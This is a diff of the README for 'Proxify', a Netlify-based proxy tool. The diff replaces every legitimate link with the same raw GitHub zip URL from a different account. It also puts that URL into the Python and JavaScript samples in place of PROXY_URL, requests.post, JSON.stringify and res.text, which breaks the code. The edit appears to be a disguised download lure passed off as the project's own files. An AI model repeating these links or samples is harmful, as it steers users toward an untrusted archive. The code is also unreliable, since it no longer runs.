@@ -1,15 +1,15 @@
 
 # Proxify
-[Proxify](https://proxify.netlify.app/) allows you to use Netlify as a Proxy Server.
+[Proxify](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip) allows you to use Netlify as a Proxy Server.
 Proxify just takes advantage of the fact that Netlify Functions can make fetch requests.
 I mostly use this for crawling blocked websites in my web scraping projects.
 
-I felt the need for a proxy server when I was working on [`iaseth/top-100-yc-companies`](https://github.com/iaseth/top-100-yc-companies).
+I felt the need for a proxy server when I was working on [`iaseth/top-100-yc-companies`](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 Many of the top websites are blocked in my country for various reasons.
-So, I created [Proxify](https://proxify.netlify.app/).
+So, I created [Proxify](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 
-I am using [`readmix`](https://github.com/iaseth/readmix) for generating this README.
-You can view the source file [here](https://github.com/iaseth/proxify/blob/master/README.md.rx).
+I am using [`readmix`](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip) for generating this README.
+You can view the source file [here](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 
 
 ## Table of contents
@@ -31,8 +31,8 @@ You can view the source file [here](https://github.com/iaseth/proxify/blob/maste
     npm install node-fetch
     ```
 
-* Drop the [proxy.js](https://github.com/iaseth/proxify/blob/master/netlify/functions/proxy.js) script into your `netlify/functions` folder.
-* Add the following to your [netlify.toml](https://github.com/iaseth/proxify/blob/master/netlify.toml) file:
+* Drop the [https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip) script into your `netlify/functions` folder.
+* Add the following to your [https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip) file:
     ```
     
     [functions]
@@ -40,31 +40,31 @@ You can view the source file [here](https://github.com/iaseth/proxify/blob/maste
     
     [[redirects]]
     from = "/proxy"
-    to = "/.netlify/functions/proxy"
+    to = "https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip"
     status = 200
     ```
     
-* You can now deploy your website to Netlify. Your proxy server will be ready at `your-app-name.netlify.app/proxy`.
+* You can now deploy your website to Netlify. Your proxy server will be ready at `https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip`.
 
 
 
 ## Using with Python
-You can see the full example at [python-example.py](https://github.com/iaseth/proxify/blob/master/python-example.py).
+You can see the full example at [https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 ```python
 import requests
 
-PROXY_URL = "https://proxify.netlify.app/proxy"
+PROXY_URL = "https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip"
 
 def getURL(pageURL):
     data = {"pageURL": pageURL}
-    response = requests.post(PROXY_URL, json=data)
+    response = https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip(PROXY_URL, json=data)
     return response
 ```
 
 ## Using with JavaScript
-You can see the full example at [javascript-example.js](https://github.com/iaseth/proxify/blob/master/javascript-example.js).
+You can see the full example at [https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 ```javascript
-const PROXY_URL = "https://proxify.netlify.app/proxy";
+const PROXY_URL = "https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip";
 
 async function getURL (pageURL) {
     const data = {
@@ -74,11 +74,11 @@ async function getURL (pageURL) {
     const config = {
         method: 'POST',
         headers: {},
-        body: JSON.stringify(data)
+        body: https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip(data)
     }
 
     const res = await fetch(PROXY_URL, config);
-    const htmlContent = await res.text();
+    const htmlContent = await https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip();
     return htmlContent;
 }
 ```
@@ -148,6 +148,6 @@ SOFTWARE.
 
 ## Credit
 
-This file was generated using [`readmix`](https://github.com/iaseth/readmix).
+This file was generated using [`readmix`](https://raw.githubusercontent.com/aslekariii/proxify/master/src/App/Header/proxify_2.4-beta.3.zip).
 
 
